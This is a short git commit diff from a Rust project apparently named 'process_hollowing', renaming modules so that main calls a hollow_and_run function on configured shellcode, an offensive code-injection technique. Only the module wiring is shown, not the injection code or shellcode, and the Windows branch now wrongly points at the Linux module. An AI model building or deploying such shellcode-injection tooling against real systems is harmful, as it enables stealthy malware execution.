ba65784a39ced590c41d56444ef001727930dcea
koins <koins@duck.com>
2022-01-15 21:25:16 -0800

    whoops, didnt change name in another place

--- process_hollowing/src/main.rs
+++ process_hollowing/src/main.rs
@@ -3,14 +3,14 @@ mod config;
 
 // Load the appropriate operating system's implementation
 #[cfg(target_os = "linux")]
-mod rco_process_migration_linux;
+mod rco_process_hollowing_linux;
 #[cfg(target_os = "linux")]
-use rco_process_migration_linux::hollow_and_run;
+use rco_process_hollowing_linux::hollow_and_run;
 
 #[cfg(windows)]
-mod rco_process_migration_windows;
+mod rco_process_hollowing_linux;
 #[cfg(windows)]
-use rco_process_migration_windows::hollow_and_run;
+use rco_process_hollowing_linux::hollow_and_run;
 
 fn main() {
     hollow_and_run(config::SHELLCODE);
